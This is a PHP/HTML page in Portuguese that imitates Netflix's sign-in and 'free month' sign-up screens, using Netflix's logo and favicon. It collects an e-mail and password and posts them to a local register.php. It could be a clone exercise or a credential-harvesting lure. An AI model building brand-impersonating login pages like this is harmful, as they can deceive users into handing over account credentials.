<head>
<title>
Netflix
</title>
<meta charset="UTF-8">
<link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
</head>
<html>
<style>
*{
	margin: 0;
	padding: 0;
	font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;
	outline: none;
    list-style:none;
}

body{
    background: #f3f3f3;
}


.header-al-home-a{
    width: 100%;
    height: 5vw;
    left: 0;
    top: 0;
    position: absolute;
    z-index: 1000;
}

.header-al-home-a svg{
		height: 3vw;
		margin-top: 1.1vw;
		margin-left: 3vw;
		opacity: .8;
		cursor: pointer;
	}

    .header-al-home-a svg:hover{
        opacity: 1;
	}

    .login-b{
    color: #e50914;
    background-color: transparent;
    line-height: normal;
    margin: 18px 3% 0;
    padding: 7px 17px;
    font-weight: 400;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
    font-size: 1.5vw;
    height: 2.2vw;
    width: 5vw;
    border: none;
    float: right;
    cursor: pointer;
}

</style>
<body>

<div class="header-al-home-a">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 81.387"><g fill="#b81d24"><path d="M256.09 76.212c4.178.405 8.354.84 12.52 1.29l9.198-22.712 8.743 24.807c4.486.562 8.97 1.152 13.44 1.768l-15.328-43.501L299.996 0H287.01l-.135.186-8.283 20.455L271.32.003h-12.822l13.237 37.565-15.644 38.644zM246.393 75.322V0h-12.817v74.265c4.275.33 8.552.684 12.817 1.056M150.113 71.11c3.46 0 6.916.026 10.366.054V43.492h15.397V31.708H160.48v-19.91h17.733V0h-30.6v71.12c.831 0 1.666-.013 2.5-.01M110.319 71.83c4.27-.152 8.544-.28 12.824-.384V11.8h11.98V.003H98.339V11.8h11.982v60.03h-.002zM12.295 79.772V34.897L27.471 77.96c4.667-.524 9.341-1.017 14.028-1.483V.001H29.201v46.483L12.825.001H0v81.384h.077c4.063-.562 8.14-1.096 12.218-1.613M85.98 11.797V.001H55.377V75.202a1100.584 1100.584 0 0 1 30.578-2.211V61.184c-5.916.344-11.82.74-17.71 1.181V43.497h15.397V31.706H68.245V11.797H85.98zM203.614 60.62V-.003h-12.873v71.876c10.24.376 20.44.9 30.606 1.56V61.619c-5.9-.381-11.81-.712-17.733-1"/></g></svg>

<?php
            if(isset($_GET['ActionFree'])){

?>
    	<a href="account.php">
<button class="login-b">
Entrar
</button>
</a>
            <?php } ?>
</div>


<style>
.body-a{
    background-image: url(/static/back2.jpg);
    width: 100%;
    height: 100%;
    background-size: cover;
}

.center{
    margin: 0px auto;
    position: relative;
    width: 30vw;
    height: 100%;
}

.card-login{
    background: #f3f3f3;
    position: absolute;
    width: 34vw;
    height: 40vw;
    bottom: 0;
    border-radius: 0.1vw;
}

.entrar{
    font-size: 2.4vw;
    color: #333;
    margin: 0 0 .4em;
    font-weight: 400;
    padding: 2vw;
}

.email-input{
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    font-size: 16px;
    border: solid 1px #b3b3b3;
    -webkit-border-radius: 2px;
    -moz-border-radius: 2px;
    border-radius: 2px;
    display: block;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    width: 85%;
    max-width: 500px;
    color: #000;
    padding: 10px 11px;
    height: 44px;
}

.email-input:focus{
    border-color: grey;
}

.pass-input{
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    font-size: 16px;
    border: solid 1px #b3b3b3;
    -webkit-border-radius: 2px;
    -moz-border-radius: 2px;
    border-radius: 2px;
    display: block;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    width: 85%;
    max-width: 500px;
    color: #000;
    padding: 10px 11px;
    height: 44px;
    position: relative;
    top: 3vw;
}

.pass-input:focus{
    border-color: grey;
}


</style>



<?php
            if(isset($_GET['ActionFree'])){

?>
<div class="free-body" style="background:#f3f3f3; height: 100%; width: 100%; position: relative;">
            <?php } else{?>
                <div class="body-a">
            <?php } ?> 

<?php
            if($_GET['ActionFree'] == 1){
?>
            <style>
            .check{
                background: url(/static/Checkmark.png) no-repeat 50% 50%;
                -moz-background-size: 60px;
                background-size: 60px;
                height: 60px;
                width: 60px;
                text-align: center;
                max-width: 440px;
                margin: 0 auto;
                position: relative;
            }

            .free{
                position: relative;
                top: 12vw;
            }

            .free p{
                font-weight: 700;
                font-size: 1.6vw;
                text-align: center;
                padding-top: 2vw;
                color: #333;
            }

            .free .text-f{
                font-size: 1.2vw;
                text-align: center;
                padding-top: 2vw;
                color: #333;
                width: 100%;
            }

            .free-btn{
                display: inline-block;
                text-decoration: none;
                line-height: 1rem;
                vertical-align: middle;
                cursor: pointer;
                font-weight: 700;
                letter-spacing: .025rem;
                -webkit-border-radius: 2px;
                -moz-border-radius: 2px;
                border-radius: 2px;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
                text-align: center;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                border: none;
                position: relative;
                min-height: 3.6vw;
                top: 2vw;
                -webkit-box-shadow: 0 1px 1px rgba(0,0,0,.25);
                -moz-box-shadow: 0 1px 1px rgba(0,0,0,.25);
                box-shadow: 0 1px 1px rgba(0,0,0,.25);
                color: #fff;
                width: 30vw;
                background: #e50914;
                font-size: 1.5vw;
            }
            </style>
            <div class="center free">
                <div class="check"></div>
                <p>Escolha seu plano.</p>
                <p class="text-f">Escolha qualquer plano; você só paga quando seu mês grátis terminar.</p>
                <a href="account.php?ActionFree=registerf"><button class="free-btn">Continuar</button></a>
            </div>


            <?php } else if($_GET['ActionFree'] == "registerf"){?>
            <style>
 .free-btn{
                display: inline-block;
                text-decoration: none;
                line-height: 1rem;
                vertical-align: middle;
                cursor: pointer;
                font-weight: 700;
                letter-spacing: .025rem;
                -webkit-border-radius: 2px;
                -moz-border-radius: 2px;
                border-radius: 2px;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
                text-align: center;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                border: none;
                position: relative;
                min-height: 3.6vw;
                top: 5vw;
                -webkit-box-shadow: 0 1px 1px rgba(0,0,0,.25);
                -moz-box-shadow: 0 1px 1px rgba(0,0,0,.25);
                box-shadow: 0 1px 1px rgba(0,0,0,.25);
                color: #fff;
                width: 30vw;
                background: #e50914;
                font-size: 1.5vw;
            }
            </style>

                <div class="center">
<div class="card-login">
<p class="entrar">Termine seu registro</p>
<center>
<div style="padding-top: 2vw;">
<form action="#" method="post">
<span style="float: left; position: absolute; top: 7.6vw; left: 2.6vw;">E-mail</span>
<input type="text" id="email" class="email-input"/>
<span style="float: left; position: absolute; top: 13.6vw; left: 2.6vw;">Senha</span>
<input type="text" id="senha" class="pass-input"/>
<button class="free-btn" id="cadastrar" name="cadastrar">CRIAR CONTA FREE 1 MÊS</button>
<style>

#resposta{
    width: 30vw;
    color: red;
    position: relative;
    top: 6vw;
    height: auto;
    margin: 0px auto;
    text-align: center;
    border-radius: 0.3vw;
    font-size: 1.5vw;
}

</style>

<div id="resposta">
    

</div>
</form>

<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script>
$(document).ready(function() {
    $("#cadastrar").click(function() {
        var email = $("#email");
        var emailPost = email.val();
        var senha = $("#senha");
        var senhaPost = senha.val();
        $.post("register.php", {email: emailPost, senha: senhaPost},
        function(data){
         $("#resposta").html(data);
         }
         , "html");
         return false;
    });
});
</script>

</div>
</center>
</div>
</div>
            <?php } else{?>

<div class="center">
<div class="card-login">
<p class="entrar">Entrar</p>
<center>
<div style="padding-top: 2vw;">
<span style="float: left; position: absolute; top: 7.6vw; left: 2.6vw;">E-mail</span>
<input type="text" class="email-input"/>
<span style="float: left; position: absolute; top: 13.6vw; left: 2.6vw;">Senha</span>
<input type="text" class="pass-input"/>
</div>
</center>
</div>
</div>
            <?php } ?>



</div>

</body>
</html>